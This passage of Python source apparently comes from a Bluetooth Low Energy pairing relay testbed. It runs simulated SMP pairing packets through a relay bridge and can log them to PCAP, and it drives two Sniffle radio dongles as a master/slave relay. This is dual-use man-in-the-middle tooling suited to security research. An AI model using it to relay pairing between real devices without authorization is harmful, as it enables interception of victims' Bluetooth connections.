    def __init__(self, config: RelayConfig, bridge: PairingRelayBridge | None = None) -> None:
        self.config = config
        self.bridge = bridge if bridge is not None else PairingRelayBridge()
        self.stop_event = threading.Event()
        self.master_runner: RelayMasterRunner | None = None
        self.slave_runner: RelaySlaveRunner | None = None

    def stop(self) -> None:
        """Signal running relay threads to terminate."""
        self.stop_event.set()

    def run(self) -> int:
        """Execute pairing relay testbed according to configured mode (mock or hardware)."""
        self.config.validate()
        if self.config.mock:
            return self._run_mock()
        return self._run_hardware()

    def _run_mock(self) -> int:
        """Execute synthetic pairing relay bridge simulation for verification without hardware."""
        logger.info(
            "Running mock pairing relay simulation on %s -> %s (duration=%s)",
            self.config.port1,
            self.config.port2,
            self.config.duration_sec,
        )
        now_us = int(time.time() * 1_000_000)
        initiator_mac = "40:11:22:33:44:11"
        target_mac = self.config.mac if self.config.mac else "50:AA:BB:CC:DD:EE"

        # 1. Simulated CONNECT_IND
        pkt1 = RelayedLinkLayerPacket(
            channel=self.config.advchan,
            rssi=-55,
            timestamp_usec=now_us,
            pdu_type="CONNECT_IND",
            initiator_mac=initiator_mac,
            target_mac=target_mac,
            raw_pdu=bytes.fromhex("052240112233441150aabbccddee"),
        )
        self.bridge.ingest_sniffed_packet(pkt1)
        self.bridge.feed_pdu(pkt1.pdu_type, pkt1.initiator_mac, pkt1.target_mac, pkt1.raw_pdu, pkt1.timestamp_usec)

        # 2. Simulated SMP Pairing Request (0x01)
        pkt2 = RelayedLinkLayerPacket(
            channel=self.config.advchan,
            rssi=-56,
            timestamp_usec=now_us + 25_000,
            pdu_type="SMP",
            initiator_mac=initiator_mac,
            target_mac=target_mac,
            raw_pdu=bytes([0x01, 0x03, 0x00, 0x01, 0x10, 0x07, 0x07]),
        )
        self.bridge.ingest_sniffed_packet(pkt2)
        self.bridge.feed_pdu(pkt2.pdu_type, pkt2.initiator_mac, pkt2.target_mac, pkt2.raw_pdu, pkt2.timestamp_usec)

        # 3. Simulated SMP Pairing Response (0x02)
        pkt3 = RelayedLinkLayerPacket(
            channel=self.config.advchan,
            rssi=-54,
            timestamp_usec=now_us + 50_000,
            pdu_type="SMP",
            initiator_mac=target_mac,
            target_mac=initiator_mac,
            raw_pdu=bytes([0x02, 0x03, 0x00, 0x01, 0x10, 0x07, 0x07]),
        )
        self.bridge.ingest_sniffed_packet(pkt3)
        self.bridge.feed_pdu(pkt3.pdu_type, pkt3.initiator_mac, pkt3.target_mac, pkt3.raw_pdu, pkt3.timestamp_usec)

        # Drain packets to mirror transmission
        forwarded = []
        while self.bridge.pending_packets_count() > 0:
            p = self.bridge.drain_next_packet()
            if p:
                forwarded.append(p)

        # Write to PCAP if requested
        if self.config.pcap_path:
            pwriter = PcapBleWriter(self.config.pcap_path)
            try:
                for f_pkt in forwarded:
                    pwriter.write_packet(
                        f_pkt.timestamp_usec,
                        BLE_ADV_AA,
                        f_pkt.channel,
                        f_pkt.rssi,
                        f_pkt.raw_pdu,
                        0,
                        0,
                    )
            finally:
                pwriter.close()

        # Handle duration timeout if provided
        if self.config.duration_sec is not None and self.config.duration_sec > 0:
            time.sleep(min(self.config.duration_sec, 0.2))

        print(f"Pairing Relay Testbed: Forwarded {len(forwarded)} packets. State: {self.bridge.current_pairing_state.name}")
        return 0

    def _run_hardware(self) -> int:
        """Execute physical dual-dongle pairing relay on attached Sniffle radios."""
        p1, p2 = allocate_dual_ports(self.config.port1, self.config.port2)
        baud1 = detect_optimal_baudrate(p1) or 921_600
        baud2 = detect_optimal_baudrate(p2) or 921_600

        logger.info("Opening Master Sniffle radio on %s at %d baud", p1, baud1)
        hw_master = SniffleHW(p1, baudrate=baud1)
        logger.info("Opening Slave Sniffle radio on %s at %d baud", p2, baud2)
        hw_slave = SniffleHW(p2, baudrate=baud2)

        # Create low-latency inter-thread IPC stream sockets
        sock_master, sock_slave = socket.socketpair(socket.AF_UNIX, socket.SOCK_STREAM)
        conn_master = RelaySocketWrapper(sock_master, ("local", 0))
        conn_slave = RelaySocketWrapper(sock_slave, ("local", 0))

        pcap_writer = None
        if self.config.pcap_path:
            pcap_writer = PcapBleWriter(self.config.pcap_path)

        self.master_runner = RelayMasterRunner(
            hw=hw_master,
            conn=conn_master,
            config=self.config,
            bridge=self.bridge,
            stop_event=self.stop_event,
            pcap_writer=pcap_writer,
        )
        self.slave_runner = RelaySlaveRunner(
            hw=hw_slave,
            conn=conn_slave,
            config=self.config,
            bridge=self.bridge,
            stop_event=self.stop_event,
        )

        def cleanup() -> None:
            self.stop_event.set()
            try:
                sock_master.close()
            except Exception:
                pass
            try:
                sock_slave.close()
            except Exception:
                pass
            for radio in (hw_master, hw_slave):
                try:
                    radio.cancel_recv()
                except Exception:
                    pass
                try:
                    radio.cmd_reset()
                except Exception:
                    pass
                try:
                    if hasattr(radio, "ser") and radio.ser and radio.ser.is_open:
                        radio.ser.close()
                except Exception:
                    pass
            if pcap_writer:
                try:
                    pcap_writer.close()
                except Exception:
                    pass

        coord = ShutdownCoordinator.get_instance()
        coord.register(cleanup)

        t_slave = threading.Thread(target=self.slave_runner.run, name="RelaySlaveRunner", daemon=True)
        t_master = threading.Thread(target=self.master_runner.run, name="RelayMasterRunner", daemon=True)

        try:
            t_slave.start()
            t_master.start()

            if self.config.duration_sec is not None:
                self.stop_event.wait(self.config.duration_sec)
                self.stop_event.set()
            else:
                while not self.stop_event.is_set():
                    time.sleep(0.1)

        except KeyboardInterrupt:
            logger.info("KeyboardInterrupt received, stopping pairing relay testbed...")
        finally:
            self.stop_event.set()
            cleanup()
            coord.unregister(cleanup)
            t_master.join(timeout=1.0)
            t_slave.join(timeout=1.0)

        forwarded_count = 0
        if self.master_runner:
            forwarded_count += self.master_runner.forwarded_packets_count
        if self.slave_runner:
            forwarded_count += self.slave_runner.forwarded_packets_count

        print(f"Pairing Relay Testbed: Forwarded {forwarded_count} packets. State: {self.bridge.current_pairing_state.name}")
        return 0
